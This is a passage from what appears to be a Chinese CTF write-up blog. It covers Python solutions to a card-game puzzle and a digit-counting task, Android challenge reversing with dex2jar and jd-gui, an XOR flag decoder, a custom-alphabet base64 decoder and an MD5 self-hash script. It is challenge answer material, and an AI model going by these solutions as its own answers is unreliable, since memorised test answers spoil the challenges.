        <span class="n">cat</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:])))</span>
        <span class="k">del</span> <span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:]</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">dog</span><span class="p">)</span><span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">cat</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    
    <span class="n">k</span> <span class="o">=</span> <span class="n">dog</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>
    <span class="n">entir</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">entir</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">entir</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">if</span> <span class="n">d</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">start</span> <span class="o">=</span> <span class="n">entir</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
        <span class="n">dog</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:])))</span>
        <span class="k">del</span> <span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:]</span>
        
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;dog</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">dog</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;cat</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">cat</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;tabel&#39;</span><span class="p">,</span> <span class="n">entir</span><span class="p">)</span>


    <span class="n">m</span> <span class="o">=</span> <span class="n">cat</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>
    <span class="n">entir</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>   <span class="c1">#放牌</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">entir</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">entir</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">if</span> <span class="n">c</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">start</span> <span class="o">=</span> <span class="n">entir</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
        <span class="n">cat</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:])))</span>
        <span class="k">del</span> <span class="n">entir</span><span class="p">[</span><span class="n">start</span><span class="p">:]</span>



<span class="k">print</span><span class="p">(</span><span class="n">dog</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">cat</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">entir</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="好家伙"></a><h3>好家伙</h3>
<blockquote>
<p>手推得出  如果最终个数为偶数时，两种情况 1)  abab&hellip;  ; 2) aaaaa&hellip;</p>
<p>奇数时，仅可能位 aaaaa&hellip;</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;string.txt&#39;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">str1</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">result</span><span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">tmp</span> <span class="o">=</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span>
        <span class="k">while</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">str1</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">==</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
                <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>  
                <span class="n">m</span> <span class="o">=</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="n">tmp</span><span class="p">[</span><span class="n">count</span> <span class="o">%</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
                <span class="k">if</span> <span class="n">tmp</span><span class="p">[(</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">tmp</span><span class="p">[</span><span class="n">count</span> <span class="o">%</span> <span class="mi">2</span><span class="p">]:</span>
                    <span class="n">count</span> <span class="o">-=</span><span class="mi">1</span>
                <span class="k">while</span> <span class="n">m</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">):</span>
                    <span class="k">if</span> <span class="n">str1</span><span class="p">[</span><span class="n">m</span><span class="p">]</span> <span class="o">==</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">):</span>
                        <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="n">k</span> <span class="o">=</span> <span class="n">m</span>
                        <span class="n">tmp</span><span class="p">[</span><span class="n">count</span> <span class="o">%</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">j</span>
                        <span class="k">if</span> <span class="n">tmp</span><span class="p">[(</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">tmp</span><span class="p">[</span><span class="n">count</span> <span class="o">%</span> <span class="mi">2</span><span class="p">]:</span>
                            <span class="n">count</span> <span class="o">-=</span><span class="mi">1</span>
                        <span class="k">break</span>
                    <span class="n">m</span> <span class="o">+=</span> <span class="mi">1</span>
                
            <span class="n">k</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">count</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
<span class="n">result1</span><span class="o">=</span><span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
        <span class="n">result1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">result1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s1">&#39;------------&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">result1</span><span class="p">,</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="android"></a><h2>Android</h2>
<a class="post-dummy-target" id="寻梦"></a><h3>寻梦</h3>
<p>下载文件，模拟器打开，根据提示，即出flag</p>
<a class="post-dummy-target" id="寻梦s"></a><h3>寻梦S</h3>
<p>下载apk，后缀改 zip， 解压，出 classes.dex，用dex2jar软件反编译为 jar</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">sh d2j-dex2jar.sh classes.dex
</code></pre></td></tr></table>
</div>
</div><p>打开jd-gui工具，打开 classes.dex，找到 Mainactivity，</p>
<p>发现代码逻辑 写个python脚本，即出 flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">array</span> <span class="o">=</span> <span class="p">[</span><span class="mi">74</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">81</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">87</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">120</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">125</span><span class="p">]</span>

<span class="err">奇数位直接与奇数异或</span>
<span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;J#S#{#o#_#r#_#o#d##&#39;</span>
<span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">array</span><span class="p">)):</span>
    <span class="k">if</span> <span class="n">k</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span><span class="mi">0</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">]))</span> <span class="o">^</span> <span class="n">array</span><span class="p">[</span><span class="n">k</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">c</span> <span class="o">+=</span> <span class="n">s</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>


</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="寻梦ss"></a><h3>寻梦SS</h3>
<p>首先根据Mainactivity给出的字符串，转换，隔一位交换。</p>
<p>然后 以为是base64（可在线转换），但是发现无法转换，即找到base64.encode函数</p>
<p>发现更改了字符表，换了之后，解密如下。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;
</span><span class="s1">a = &#39;vtvhJb1CrO1SBAxTjB3CvO2Sv5zxn53gZLxTnF1xbI0tZZsB&#39;
</span><span class="s1">print(len(a))
</span><span class="s1">c=[]
</span><span class="s1">c.extend(a)
</span><span class="s1">for i in range(len(a)-1,1,-1):
</span><span class="s1">    tmp = c[i]
</span><span class="s1">    c[i] = c[i-2]
</span><span class="s1">    c[i-2] = tmp
</span><span class="s1">
</span><span class="s1">result = &#39;&#39;.join(c)
</span><span class="s1">print(result,len(result))
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="c1">#s = {&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;0&#39;, &#39;z&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;/&#39;, &#39;+&#39;, &#39;=&#39;}</span>
<span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxy0z123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ/+=&#34;</span>
<span class="n">char_array_3</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">}</span>
<span class="n">char_array_4</span> <span class="o">=</span> <span class="p">{</span><span class="mi">61</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">61</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">My_base64_decode</span><span class="p">(</span><span class="n">inputs</span><span class="p">):</span>
	<span class="c1"># 将字符串转化为2进制</span>
	<span class="n">bin_str</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">inputs</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="s1">&#39;=&#39;</span><span class="p">:</span>
			<span class="n">x</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
			<span class="n">bin_str</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;{:0&gt;6}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
	<span class="c1">#print(bin_str)</span>
	<span class="c1"># 输出的字符串</span>
	<span class="n">outputs</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
	<span class="n">nums</span> <span class="o">=</span> <span class="n">inputs</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
	<span class="k">while</span> <span class="n">bin_str</span><span class="p">:</span>
		<span class="n">temp_list</span> <span class="o">=</span> <span class="n">bin_str</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
		<span class="n">temp_str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">temp_list</span><span class="p">)</span>
		<span class="c1">#print(temp_str)</span>
		<span class="c1"># 补足8位字节</span>
		<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">temp_str</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">):</span>
			<span class="n">temp_str</span> <span class="o">=</span> <span class="n">temp_str</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span> <span class="o">*</span> <span class="n">nums</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]</span>
		<span class="c1"># 将四个6字节的二进制转换为三个字符</span>
		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">temp_str</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)):</span>
			<span class="n">outputs</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">temp_str</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">],</span><span class="mi">2</span><span class="p">))</span>
		<span class="n">bin_str</span> <span class="o">=</span> <span class="n">bin_str</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>	
	<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Decrypted String:</span><span class="se">\n</span><span class="si">%s</span><span class="s2"> &#34;</span><span class="o">%</span><span class="n">outputs</span><span class="p">)</span>


<span class="n">My_base64_decode</span><span class="p">(</span><span class="s1">&#39;sBvtvhJb1CrO1SBAxTjB3CvO2Sv5zxn53gZLxTnF1xbI0tZZ&#39;</span><span class="p">)</span>

</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="nightshadowの面试题"></a><h2>NightShadowの面试题</h2>
<a class="post-dummy-target" id="md5-challenge1"></a><h3>MD5 Challenge（1）</h3>
<blockquote>
<p>听说MD5是什么很厉害的哈希算法，我才不相信呢！</p>
<p>请制作一个能显示本文件md5的文件，附上制作过程</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>



<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">file_name</span> <span class="o">=</span> <span class="s2">&#34;md51.py&#34;</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">file_md5</span><span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">file_md5</span><span class="p">)</span>


</code></pre></td></tr></table>
</div>
</div></div>
    </div></div>
            </main><footer class="footer">
    <div class="copyright"><div class="copyright-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
        </div>

        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Xingyu</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
    </div>
</footer></div><a href="#" class="dynamic-to-top" id="dynamic-to-top" data-scroll>
            <span>&nbsp;</span>
        </a><script src="/js/lib/jquery/jquery.slim.min.js"></script><script src="/js/lib/lazysizes/lazysizes.min.js"></script><script src="/js/lib/smooth-scroll/smooth-scroll.polyfills.min.js"></script><script>window.scroll = new SmoothScroll('[data-scroll]', {speed: 300, speedAsDuration: true});</script><link rel="stylesheet" href="/css/lib/katex/katex.min.css"><script src="/js/lib/katex/katex.min.js"></script><script defer src="/js/lib/katex/auto-render.min.js"></script><link rel="stylesheet" href="/css/lib/katex/copy-tex.min.css"><script defer src="/js/lib/katex/copy-tex.min.js"></script><script defer src="/js/lib/katex/mhchem.min.js"></script><script>
        document.addEventListener("DOMContentLoaded", function () {
            renderMathInElement(document.body, {
                delimiters: [
                    { left: "$$", right: "$$", display: true },
                    { left: "\\(", right: "\\)", display: false },
                    { left: "\\[", right: "\\]", display: true },{ left: "$", right: "$", display: false },]
            });
        });
    </script><script src="/js/blog.min.js"></script></body>
</html>